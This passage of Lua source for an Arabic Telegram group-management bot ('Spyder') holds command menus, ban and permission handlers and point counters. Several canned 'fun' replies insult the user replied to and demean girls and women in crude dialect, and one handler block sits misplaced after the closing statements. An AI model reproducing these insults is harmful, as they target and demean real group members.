send(msg.chat_id_, msg.id_,"⌔︙ تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
if redis:get('Spyder:'..bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del('Spyder:'..bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "⌔︙ تم الغاء الامر ") 
redis:del('Spyder:'..bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del('Spyder:'..bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get('Spyder:'..bot_id..'idgem:user'..msg.chat_id_)  
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, "⌔︙ تم اضافة له {"..numadded..'} من النقاط', 1, 'md')  
end
------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
zain = text:match("^اضف رسائل (%d+)$")
redis:set('Spyder:'..bot_id..'id:user'..msg.chat_id_,zain)  
redis:setex('Spyder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, '⌔︙ ارسل لي عدد الرسائل الان') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
zain = text:match("^اضف نقاط (%d+)$")
redis:set('Spyder:'..bot_id..'idgem:user'..msg.chat_id_,zain)  
redis:setex('Spyder:'..bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, '⌔︙ ارسل لي عدد النقاط الان') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_,"⌔︙ تم اضافة له {"..Num..'} من النقاط')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
redis:del('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
redis:incrby('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\n⌔︙ تم اضافة له {"..Num..'} من الرسائل')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text == 'فحص البوت' and Owners(msg) then
local Chek_config = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_config = JSON.decode(Chek_config)
if Json_config.ok == true then
if Json_config.result.status == "administrator" then
if Json_config.result.can_change_info == true then
info = 'ꪜ' else info = '✘' end
if Json_config.result.can_delete_messages == true then
delete = 'ꪜ' else delete = '✘' end
if Json_config.result.can_invite_users == true then
invite = 'ꪜ' else invite = '✘' end
if Json_config.result.can_pin_messages == true then
pin = 'ꪜ' else pin = '✘' end
if Json_config.result.can_restrict_members == true then
restrict = 'ꪜ' else restrict = '✘' end
if Json_config.result.can_promote_members == true then
promote = 'ꪜ' else promote = '✘' end 
send(msg.chat_id_,msg.id_,'\n⌔︙  اهلا عزيزي البوت هنا ادمن'..'\n💢︙  وصلاحياته هي ↓ \nٴ━━━━━━━━━━'..'\n⌔︙  تغير معلومات المجموعه ↞ ❴ '..info..' ❵'..'\n⌔︙  حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n⌔︙  حظر العضوين ↞ ❴ '..restrict..' ❵'..'\n⌔︙  دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n⌔︙  تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n⌔︙  اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
----------------------------------------------------------------------------
if text == 'الالعاب' or text == 'اللعبه' and redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
Text_Games = [[
⌔*︙* قائمه الالعاب لديك ↓
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⌔*︙* لعبة بات <> بات
⌔*︙* لعبة خمن <> خمن
⌔*︙* لعبه الاسرع <> الاسرع
⌔*︙* لعبة سمايل <> سمايل
⌔*︙* لعبة المختلف <> المختلف
⌔*︙* لعبة امثله <> امثله
⌔*︙* لعبة العكس <> العكس
⌔*︙* لعبة حزوره <> حزوره
⌔*︙* لعبة معاني <> معاني
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text_Games) 
end
----------------------------------------------------------------------------
if text == 'الاوامر' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'⌔*︙*للأدمنيـــــــه فقــــــــط') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔*︙*عذراً عليك الاشتراك في القناة\n⌔*︙*اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
⌔*︙**هناكـ {6} اوامر لعرضها*
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*م1  ↫ اوامر حماية المجموعه
⌔*︙*م2 ↫ اوامر ادمنية المجموعه
⌔*︙*م3 ↫ آوآمر آلوضع والمسح
⌔*︙*م4 ↫ آوآمر مدراء المجموعه
⌔*︙*م5 ↫ آوآمر منشئين المجموعه
⌔*︙*م6 ↫ اوآمر مطور اساسي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م1' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'⌔*︙*للأدمنيـــــــه فقــــــــط') 
return false
end
print(AddChannel(msg.sender_user_id_))
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔*︙*عذراً عليك الاشتراك في القناة\n⌔*︙*اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
⌔*︙* اوامر حماية المجموعه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⌔*︙*قفل ، فتح ↫ الامر 
⌔*︙*تستطيع قفل حمايه كما يلي ...
⌔*︙*↫ { بالتقيد ، بالطرد ، بالكتم }
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙* الدردشه
⌔*︙* الروابط
⌔*︙* المعرفات
⌔*︙* التاك
⌔*︙* الشارحه
⌔*︙* الملصقات
⌔*︙* المتحركه
⌔*︙* الفيديو
⌔*︙* الصور
⌔*︙* الاغاني
⌔*︙* الصوت
⌔*︙* التوجيه
⌔*︙* الدخول
⌔*︙* الاضافه
⌔*︙* البوتات
⌔*︙* الاشعارات
⌔*︙* التعديل
⌔*︙* الميديا
⌔*︙* الجهات
⌔*︙* الالعاب
⌔*︙* الملفات
⌔*︙* السيلفي
⌔*︙* الكيبورد
⌔*︙* الماركداون
⌔*︙* الانلاين 
⌔*︙* الكلايش
⌔*︙* التكرار
⌔*︙* الفارسيه
⌔*︙* الكلمات السيئه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م2' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'⌔*︙*للأدمنيـــــــه فقــــــــط') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔*︙*عذراً عليك الاشتراك في القناة\n⌔*︙*اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
⌔*︙*اوامر ادمنية المجموعه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*كتم  رد , معرف ، ايدي 
⌔*︙*حظر  رد , معرف ، ايدي 
⌔*︙*تقيد  رد , معرف ، ايدي 
⌔*︙*طرد  رد , معرف ، ايدي 
⌔*︙*الغاء كتم  رد , معرف ، ايدي 
⌔*︙*الغاء حظر  رد , معرف ، ايدي 
⌔*︙*الغاء تقيد  رد , معرف ، ايدي 
⌔*︙*المقيدين 
⌔*︙*المكتومين  
⌔*︙*المحظورين 
⌔*︙*الترحيب
⌔*︙*الصلاحيات
⌔*︙*اضف صلاحيه + اسم الصلاحيه
⌔*︙*مسح صلاحيه + اسم الصلاحيه
⌔*︙*الاعدادات 
⌔*︙*كشف البوتات
⌔*︙*منع / الغاء منع
⌔*︙*تعطيل / تفعيل الترحيب
⌔*︙*تثبيت / الغاء التثبيت
⌔*︙*ضع تكرار + العدد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م3' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'⌔*︙*للأدمنيـــــــه فقــــــــط') 
return false
end
print(AddChannel(msg.sender_user_id_))
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔*︙*عذراً عليك الاشتراك في القناة\n⌔*︙*اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
⌔*︙*اوامر الوضع والمسح
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*وضع صوره
⌔*︙*وضع وصف 
⌔*︙*وضع اسم + اسم
⌔*︙* ضع رابط
⌔*︙* ضع قوانين
⌔*︙* ضع ترحيب
⌔*︙* كشف بالرد
⌔*︙* كشف بالمعرف
⌔*︙*تنظيف +العدد
⌔*︙*المنشئين
⌔*︙*المدراء
⌔*︙*الادمنيه
⌔*︙*المميزين
⌔*︙*مسح الادمنيه 
⌔*︙*مسح المميزين
⌔*︙*مسح المكتومين
⌔*︙*مسح المحظورين
⌔*︙*مسح البوتات
⌔*︙*مسح الرابط
⌔*︙*مسح الترحيب
⌔*︙*مسح القوانين
⌔*︙*مسح قائمه المنع
⌔*︙*تفعيل/ تعطيل اوامر التحشيش
⌔*︙*وضع ترحيب (user, #name#)
⌔*︙*تفعيل / تعطيل الترحيب
⌔*︙*تاك للكل
⌔*︙*تنزيل الكل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م4' then
if not Owners(msg) then
send(msg.chat_id_, msg.id_,'⌔*︙*للمدراء فقــــــــط') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔*︙*عذراً عليك الاشتراك في القناة\n⌔*︙*اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
⌔*︙*آوامر المدراء المجموعه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*رفع / تنزيل ادمن
⌔*︙*رفع / تنزيل مميز
⌔*︙*رفع الادمنيه
⌔*︙*المعلومات + ايدي
⌔*︙*الحساب + ايدي
⌔*︙*الادمنيه
⌔*︙*المميزين
⌔*︙*تعين الايدي
⌔*︙*مسح الايدي
⌔*︙* اضف/حذف رد
⌔*︙* ردود المدير
⌔*︙*مسح ردود المدير
⌔*︙*رفع القيود
⌔*︙*كشف القيود
⌔*︙*منع على (متحركه) بالرد
⌔*︙*منع على (صوره) بالرد
⌔*︙*منع على (ملصق) بالرد
⌔*︙* تعطيل/تفعيل ردود المدير
⌔*︙* تعطيل/تفعيل ردود المطور
⌔*︙*تعطيل/تفعيل الايدي بالصوره
⌔*︙*تعطيل/تفعيل الالعاب
⌔*︙*تعطيل/تفعيل صيح
⌔*︙*تعطيل/تفعيل ضافني
⌔*︙*تعطيل/تفعيل الايدي
⌔*︙*تعطيل/تفعيل اطردني
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م5' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔*︙*للمنشئين فقــــــــط') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔*︙*عذراً عليك الاشتراك في القناة\n⌔*︙*اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
⌔*︙*اوامر منشئين المجموعه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⌔*︙*تفعيل / تعطيل
⌔*︙* اضف امر
⌔*︙* حذف امر
⌔*︙* الاوامر المضافه
⌔*︙* حذف الاوامر المضافه
⌔*︙*مسح المنشئين
⌔*︙*رفع/تنزيل منشئ
⌔*︙*المنشئين
⌔*︙*رفع/تنزيل مدير
⌔*︙*المدراء
⌔*︙*مسح المدراء
⌔*︙* رفع ادمن بالكروب
⌔*︙* تنزيل ادمن بالكروب
⌔*︙* رفع ادمن بكل الصلاحيات
⌔*︙* تنزيل ادمن بكل الصلاحيات
⌔*︙* تفعيل/تعطيل الحظر
⌔*︙* تفعيل/تعطيل الرفع
⌔*︙* تفعيل/تعطيل الردود
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م6' then
if not Sudo_bot(msg) then
send(msg.chat_id_, msg.id_,'⌔*︙*للمطور الاساسي فقــــــــط') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔*︙*عذراً عليك الاشتراك في القناة\n⌔*︙*اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
⌔*︙*اوامر المطور الاساسي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*تحديث السورس 
⌔*︙*ضع شرط التفعيل + العدد
⌔*︙*تفعيل / تعطيل الوضع الخدمي
⌔*︙* تفعيل/تعطيل الاذاعه
⌔*︙* تفعيل/تعطيل التواصل
⌔*︙* تفعيل/تعطيل المغادره
⌔*︙*رفع المنشئ
⌔*︙* المنشئ
⌔*︙* مسح الاساسين
⌔*︙* المنشئين الاساسين
⌔*︙* رفع/تنزيل منشئ اساسي
⌔*︙*اذاعه خاص / اذاعه
⌔*︙* اذاعه بالتوجيه
⌔*︙* اذاعه بالتوجيه خاص
⌔*︙*اسم البوت + غادر
⌔*︙*تغير اسم البوت
⌔*︙*اضف/حذف رد عام
⌔*︙* تنظيف المشتركين
⌔*︙* تنظيف المجموعات
⌔*︙*ضع كليشه المطور
⌔*︙*الاحصائيات
⌔*︙*المشتركين
⌔*︙*المطورين
⌔*︙*رفع / تنزيل مطور
⌔*︙*مسح المطورين 
⌔*︙*حضر عام
⌔*︙*الغاء العام
⌔*︙*قائمه العام
⌔*︙*مسح قائمه العام
⌔*︙*نسخه احتياطيه للمجموعات
⌔*︙* رفع النسخه الاحتياطيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌔*︙*مطور البوت { [@A_5_Y_7] }
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'رابط الحذف' or text == 'رابط حذف' then
t =[[
╗ ↫ رابط الحذف 🔎
╣ ↫ فكر قبل كولشي❗️
╝ ↫ [هذا الرابط...](https://telegram.org/deactivate)
‏
]]
send(msg.chat_id_, msg.id_,t) 
return false
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
end -- Chat_Type = 'GroupBot' 
end -- end msg
end --end 
-----------------------------------------------------------------------------------------------if text == 'منح الحظر' and tonumber(msg.reply_to_message_id_) > 0 and Constructor(msg) then   
if text == 'منح الحظر' and tonumber(msg.reply_to_message_id_) > 0 and Constructor(msg) then   
function by_reply(extra, result, success)   
if not msg.can_be_deleted_ == true then   
send(msg.chat_id_,msg.id_,"*⌔*︙*انا لست ادمن هنا يرجى ترقيتي \n👨🏻‍✈️*")   
return false 
end      
if tonumber(result.sender_user_id_) == tonumber(bot_id) then    
send(msg.chat_id_,msg.id_,"*⌔*︙*انا بوت استطيع طرد - حظر المستخدمين \n👨🏻‍✈️*")   
return false  
end   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
redis:sadd('Spyder:'..bot_id..'SET:BAN'..msg.chat_id_,result.sender_user_id_)     
usertext = '\n⌔*︙* العضو ❲ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..') ❳ 📣┋تم منحه صلاحية ( طرد - حظر ) المستخدمين\n✓'
send(msg.chat_id_, msg.id_, usertext)
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
return false
end
if text == 'الغاء منح الحظر' and tonumber(msg.reply_to_message_id_) > 0 and Constructor(msg) then   
function by_reply(extra, result, success)   
if not msg.can_be_deleted_ == true then   
send(msg.chat_id_,msg.id_,"*⌔*︙*انا لست ادمن هنا يرجى ترقيتي \n👨🏻‍✈️*")   
return false 
end      
if tonumber(result.sender_user_id_) == tonumber(bot_id) then    
send(msg.chat_id_,msg.id_,"*⌔*︙*انا بوت لا تستطيع منعي من الحظر - الطرد \n👨🏻‍✈️*")   
return false  
end   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
redis:srem('Spyder:'..bot_id..'SET:BAN'..msg.chat_id_,result.sender_user_id_)     
usertext = '\n⌔*︙* العضو ❲ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..') ❳ ⌔*︙*تم الغاء منحه صلاحية ( طرد - حظر ) المستخدمين\n✓'
send(msg.chat_id_, msg.id_, usertext)
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
return false
end

function tdcli_update_callback(data)  -- clback
if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.date_ and msg.date_ < tonumber(os.time() - 15) then
print('OLD MESSAGE')
return false
end
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then
return false
end
--------------------------------------------------------------------------------------------------------------
if text and not redis:sismember('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
redis:del('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_) 
end
--------------------------------------------------------------------------------------------------------------
if text then
local NewCmmd = redis:get('Spyder:'..bot_id.."Set:Za:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if (text and text == "تعطيل اوامر التحشيش") then 
send(msg.chat_id_, msg.id_, '⌔︙تم تعطيل اوامر التحشيش')
redis:set('Spyder:'..bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التحشيش") then 
send(msg.chat_id_, msg.id_, '⌔︙تم تفعيل اوامر التحشيش')
redis:del('Spyder:'..bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (redis:get('Spyder:'..bot_id..'Name:Bot') or 'العالمي')
if not redis:get('Spyder:'..bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيك بهذا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير الحب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' شنو رئيك بهاي' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني هيه ','ختولي ماحبها ','خانتني ويه صديقي 😔','بس لو الكفها اله اعضها 💔','خوش بنيه بس عده مكسرات زايده وناقصه منا ومنا وهيه تدري بنفسها 😒','جذابه ومنافقه سوتلي مشكله ويه الحب مالتي ','ئووووووووف اموت ع ربها ','ديرو بالكم منها تلعب ع الولد ?? ضحكت ع واحد قطته ايفون 7 ','صديقتي وختي وروحي وحياتي ','فد وحده منحرفه 😥','ساكنه بالعلاوي ونته حدد بعد لسانها لسان دلاله 🙄🤐','ام سحوره سحرت اخويا وعلكته 6 سنوات 🤕','ماحبها 🙁','بله هاي جهره تسئل عليها ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئل ع بنات العالم ولي يله 🏼','ياخي بنيه حبوبه بس لبعرك معمي عليها تشرب هواي 😹' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
-----------------ZAINALABDEEN___________________
local Name_Bot = (redis:get('Spyder:'..bot_id..'Name:Bot') or 'العالمي')
if not redis:get('Spyder:'..bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' بوسه' or text ==  ""..Name_Bot..' مصه' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'اععع 🤢خده بي حب شباب الوصخ😹😹','موااح 💋 مواااح  حياتي💋😌','💋😞نسخ لصق ع الشفه 👄'}
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' هينه' or text == ""..Name_Bot..' رزله' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, 'انجب لك هذا مطوري العشق 😌💋')
return false  end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, 'لك مگدر اهين نفسي 😞😂')
return false  end
local Fun = {'لك دايح ، احترم نفسك لا بال 👠😠','ها مصراع تراچي ، اگعد راحه تره روحي طالعه 😐','ها ابن الحنينه، ليش متسكت وتنجب 🌚','تعال لك كواد فرخ دودكي مستنقع 😹👻','حبيبي شدا تحس انته هسه من تكمز !؟ دبطل حركاتكم هاي 🌝❤️','يمعود هاذا من جماعة لا تعورني 😹'}
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text == "انجب" or text == "نجب" or text =="جب" then
if Sudo_id(msg) then  
send(msg.chat_id_,msg.id_,"حاضر مو تدلل حضره المطور  😇 ")
elseif Sudo_bot(msg) then 
send(msg.chat_id_,msg.id_,"حاضر مو تدلل مطوري 😋")
elseif Constructor(msg) then 
send(msg.chat_id_,msg.id_,"ع راسي تدلل انته المنشئ تاج راسي 😌")
elseif Owners(msg) then 
send(msg.chat_id_,msg.id_,"لخاطرك راح اسكت لان مدير وع راسي  😌")
elseif Mod(msg) then 
send(msg.chat_id_,msg.id_,"فوك مامصعدك ادمن ؟؟ انته انجب 😏") 
elseif Vips(msg) then 
send(msg.chat_id_,msg.id_,"فوك مامصعدك مميز ؟ وتكمز 🤨")
else 
send(msg.chat_id_,msg.id_,"انجب انته لاتندفر 😏")
end 
end
-------------------------------------------------------------------------------------------------------------- 
if text and redis:get('Spyder:'..bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = redis:get('Spyder:'..bot_id.."Set:Za:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
redis:del('Spyder:'..bot_id.."Set:Za:Group:New1"..msg.chat_id_..":"..text)
redis:del('Spyder:'..bot_id.."Set:Za:Group:New"..msg.chat_id_)
redis:srem('Spyder:'..bot_id.."List:ZaYon:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"⌔︙تم ازالة الامر من المجموعه")  
else
send(msg.chat_id_, msg.id_,"⌔︙لا يوجد امر بهاذا الاسم تاكد من الامر واعد المحاوله")  
end
redis:del('Spyder:'..bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
---------------
if text then
local NewCmmd = redis:get('Spyder:'..bot_id.."Set:Za:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_User(msg.chat_id_,msg.sender_user_id_) then 
Group_Kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
Group_Kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and GBan_User(msg.sender_user_id_) then 
Group_Kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GBan_User(msg.content_.members_[0].id_) then 
Group_Kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
redis:set('Spyder:'..bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = redis:get('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Spyder = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_config = JSON.decode(Spyder)
if Json_config.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
